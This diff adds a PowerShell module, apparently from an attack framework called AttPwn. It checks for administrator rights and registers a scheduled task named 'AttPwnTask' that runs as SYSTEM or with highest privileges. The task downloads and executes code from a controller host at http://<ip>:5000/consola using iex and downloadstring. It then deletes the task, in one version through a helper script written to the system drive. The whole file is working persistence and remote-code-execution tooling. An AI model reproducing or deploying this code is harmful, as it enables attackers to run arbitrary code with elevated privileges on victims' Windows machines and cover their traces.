@@ -1,0 +1,191 @@
+
+
+
+
+
+
+
+
+function invoke-scheduleTask
+    {
+        param(
+        [String] $ip
+      )
+
+      
+    $good = $false
+    $results = $null
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+        { 
+        $versionBuild= [System.Environment]::OSVersion.Version.Build
+          if ($versionBuild –lt 9200)      
+            {
+            $resultados =  w7version
+            $results = $resultados.results
+            $good = $resultados.success
+            }   
+          else
+            {
+            $resultados =  w10version
+            $results = $resultados.results
+            $good = $resultados.success
+            }
+          }
+      else 
+        {
+        $results = "Administrator or System privileges necessary."
+        }
+
+    return @{results=$results | Out-String;success=$good}
+
+    }
+
+function w7version 
+    {    
+      
+
+      $TaskName = "AttPwnTask"
+      
+
+      $TaskDescr = "Run a powershell AttPwnTask"
+      
+
+      $uri = "http://" + $ip + ":5000/consola"
+      $TaskCommand = $Env:WinDir+"\system32\windowspowershell\v1.0\powershell.exe"
+      
+
+      $TaskArg = "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id  "
+  
+      
+
+      $TaskStartTime = [datetime]::Now.AddMinutes(1) 
+      
+
+      $service = new-object -ComObject("Schedule.Service")
+      
+
+      
+
+      $service.Connect()
+      $rootFolder = $service.GetFolder("\")
+  
+      $TaskDefinition = $service.NewTask(0) 
+      $TaskDefinition.RegistrationInfo.Description = "$TaskDescr"
+      $TaskDefinition.Settings.Enabled = $true
+      $TaskDefinition.Settings.AllowDemandStart = $true
+  
+      $triggers = $TaskDefinition.Triggers
+      
+
+      $trigger = $triggers.Create(1) 
+
+      $trigger.StartBoundary = $TaskStartTime.ToString("yyyy-MM-dd'T'HH:mm:ss")
+      $trigger.Enabled = $true
+  
+      
+
+      $Action = $TaskDefinition.Actions.Create(0)
+      $action.Path = "$TaskCommand"
+      $action.Arguments = "$TaskArg"
+      $Action = $TaskDefinition.Actions.Create(0)
+      
+      $delete_function = @" 
+      function invoke-DeleteTask 
+              {
+              
+
+              `$TS = New-Object -ComObject Schedule.Service
+              
+
+              `$TS.Connect(`$env:COMPUTERNAME)
+              
+
+              `$TaskFolder = `$TS.GetFolder("\")
+              
+
+              `$Tasks = `$TaskFolder.GetTasks(1)
+              
+
+              `$TaskToDelete = "AttPwnTask"
+              
+
+              foreach(`$Task in `$Tasks)
+                  {
+                  if(`$Task.Name -eq `$TaskToDelete)
+                      {
+                      `$TaskFolder.DeleteTask(`$Task.Name,0)
+                      }
+                  }
+              }
+          if (Test-Path `$Env:SystemDrive"\DeleteTask.txt") 
+              {
+              Remove-Item `$Env:SystemDrive"\DeleteTask.txt"
+              }
+  
+      invoke-DeleteTask
+"@
+      $delete_function > $Env:SystemDrive"\DeleteTask.txt"
+      $TaskArg = "-command iex (Get-Content -Path $Env:SystemDrive\DeleteTask.txt -Raw)"
+      $action.Path = "$TaskCommand"
+      $action.Arguments = "$TaskArg"
+      $results = "Task AttPwnTask create for run at the time " + ($TaskStartTime.ToString("yyyy-MM-dd' T 'HH:mm:ss")) | Out-String  
+      $good = $true
+      
+
+      $rootFolder.RegisterTaskDefinition("$TaskName",$TaskDefinition,6,"System",$null,5)
+  
+    $results = "Task AttPwnTask create for run at the time " + ($TaskStartTime.ToString("yyyy-MM-dd' T 'HH:mm:ss")) | Out-String  
+    $good = $true
+
+    return @{results=$results | Out-String ;success=$good}
+
+    }
+
+
+
+    function w10version 
+      {
+      $time  = (get-date).AddMinutes(1).ToString("HH:mm")
+      $uri = "http://" + $ip + ":5000/consola"
+      $Action = @()
+      $Action += New-ScheduledTaskAction -Execute "$Env:WinDir\system32\windowspowershell\v1.0\powershell.exe" -Argument "-command iex(new-object net.webclient).downloadstring('$uri');consola -id $global:id "
+      $Action += New-ScheduledTaskAction -Execute "$Env:WinDir\system32\windowspowershell\v1.0\powershell.exe" -Argument "-command  Unregister-ScheduledTask  -TaskName 'AttPwnTask'-Confirm:`$false"
+      $Trigger = New-ScheduledTaskTrigger -Once -At $time 
+      $User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
+      $Set = New-ScheduledTaskSettingsSet
+      $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
+      Register-ScheduledTask AttPwnTask -InputObject $object
+      $results = "Task AttPwnTask create for run at the time "  + $time | Out-String  
+      $good = $true
+      
+      return @{results=$results | Out-String;success=$good}
+
+      }
+
+
+
+$execute = {
+  
+}
+
+
+
+
+
+
+$execute = invoke-scheduleTask -ip $global:remoteip
+
+
+
+  
+
+  
+
+    
+  
+
+
+return @{results=$execute.results | Out-String;success=$execute.success}
+
